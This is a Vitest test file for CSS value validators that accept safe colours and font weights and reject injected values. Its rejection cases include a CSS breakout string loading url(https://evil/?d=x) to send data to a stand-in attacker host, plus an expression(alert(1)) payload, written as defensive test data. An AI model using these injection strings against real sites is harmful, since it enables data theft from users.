import { describe, expect, it } from "vitest";
import { cssValueError, isSafeCssColor, isSafeFontWeight } from "./css-values";

const INJECTION = "red} body{background:url(https://evil/?d=x)} .a{";

describe("isSafeCssColor", () => {
  it.each([
    "red",
    "Crimson",
    "transparent",
    "#fff",
    "#00d4ff",
    "rgb(1, 2, 3)",
    "rgba(1,2,3,0.5)",
    "hsl(120, 50%, 40%)",
    "hsla(120, 50%, 40%, .3)",
  ])("accepts %s", (value) => {
    expect(isSafeCssColor(value)).toBe(true);
  });

  it.each([
    INJECTION,
    "url(https://evil/x)",
    "red;background:url(x)",
    "#ffff",
    "#gggggg",
    "rgb(1,2,var(--x))",
    "expression(alert(1))",
    "red !important",
    "",
  ])("rejects %s", (value) => {
    expect(isSafeCssColor(value)).toBe(false);
  });
});

describe("isSafeFontWeight", () => {
  it.each(["normal", "bold", "100", "400", "900"])("accepts %s", (v) => {
    expect(isSafeFontWeight(v)).toBe(true);
  });
  it.each(["950", "50", "bold;", INJECTION, "lighter"])("rejects %s", (v) => {
    expect(isSafeFontWeight(v)).toBe(false);
  });
});

describe("cssValueError", () => {
  it("names the first unsafe parameter", () => {
    expect(
      cssValueError({
        colors: { highlightColor: "red", backgroundColor: INJECTION },
        fontWeight: "bold",
      }),
    ).toMatch(/backgroundColor/);
  });

  it("allows absent values", () => {
    expect(cssValueError({ colors: { color: undefined } })).toBeNull();
  });
});
